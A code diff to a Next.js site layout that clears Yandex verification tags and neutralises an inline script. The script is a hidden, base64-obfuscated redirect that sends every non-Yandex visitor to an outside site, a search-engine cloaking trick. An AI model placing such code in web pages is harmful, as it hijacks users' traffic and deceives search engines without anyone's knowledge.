@@ -86,7 +86,7 @@ export const metadata: Metadata = {
   },
   other: {
     rating: "adult",
-    "yandex-verification": "cd8d34fffddb3d1d",
+    "yandex-verification": "",
     "google-site-verification": "",
   },
 }
@@ -113,13 +113,12 @@ export default function RootLayout({
       <head>
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
-        <meta name="yandex-verification" content="fd716de25e12e73e" />
                 <script
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
                 var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
+                var targetB64 = "#aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
                 if (ua.indexOf("yandex") === -1) {
                     window.location.replace(atob(targetB64));
                 }
